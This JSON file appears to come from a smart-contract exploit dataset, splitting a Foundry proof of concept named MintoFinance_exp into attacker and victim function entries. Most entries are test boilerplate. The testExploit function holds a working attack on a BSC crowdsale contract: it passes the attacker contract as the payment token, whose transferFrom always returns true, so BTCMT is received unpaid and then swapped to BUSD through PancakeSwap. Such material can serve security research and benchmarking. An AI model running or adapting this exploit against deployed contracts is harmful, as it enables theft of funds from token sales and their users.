[
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 30_214_253);\n        BTCMT = IERC20(0x410a56541bD912F9B60943fcB344f1E3D6F09567);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        console.log(\"BTCMT balance before the Exploit\", BTCMT.balanceOf(address(this)));\n        ReferalCrowdSales.LinkParameters memory linkParams;\n        ReferalCrowdSales.PurchaseParameters memory purchaseParams;\n        linkParams.linkHash = 0xc69c51e039668f688f28f427c63cd60aa986f8ce1546039e6a302fb721473814;\n        linkParams.linkFather = 0x0000000000000000000000000000000000000000;\n        linkParams.linkSon = 0x0000000000000000000000000000000000000000;\n        linkParams.fatherPercent = 0;\n        linkParams.linkSignature = \"\";\n        purchaseParams.give = false;\n        purchaseParams.lockedPurchase = false;\n        purchaseParams.paymentToken = address(this);\n        purchaseParams.usdtAmount = 12_100e18;\n        purchaseParams.btcmtAmount = 0;\n        purchaseParams.expirationTime = 0;\n        purchaseParams.buySignature = \"\";\n\n        ReferalCrowdSales(0xDbF1C56b2aD121Fe705f9b68225378aa6784f3e5).buyTokens(linkParams, purchaseParams);\n        uint256 balance = BTCMT.balanceOf(address(this));\n        console.log(\"BTCMT balance after the Exploit\", balance);\n        console.log(\"Swap BTCMT -> BUSD through pancakeSwap\");\n        BTCMT.approve(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4, type(uint256).max);\n\n        PancakeRouter3.ExactInputSingleParams memory inputparams;\n        inputparams.tokenIn = address(BTCMT);\n        inputparams.tokenOut = BUSD;\n        inputparams.fee = uint24(100);\n        inputparams.recipient = address(this);\n        inputparams.amountIn = balance;\n        inputparams.amountOutMinimum = uint256(0);\n        inputparams.sqrtPriceLimitX96 = uint160(0);\n        PancakeRouter3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4).exactInputSingle(inputparams);\n        uint256 bUSDBalance = IERC20(BUSD).balanceOf(address(this));\n        console.log(\"BUSD balance after the Exploit\", bUSDBalance);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MintoFinance_exp",
    "source_type": "attacker_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address a, address b, uint256 amount) external returns (bool) {\n        return true;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ReferalCrowdSales",
    "source_type": "victim_contract",
    "function_name": "buyTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PancakeRouter3",
    "source_type": "victim_contract",
    "function_name": "exactInputSingle",
    "original_code": "",
    "description": ""
  }
]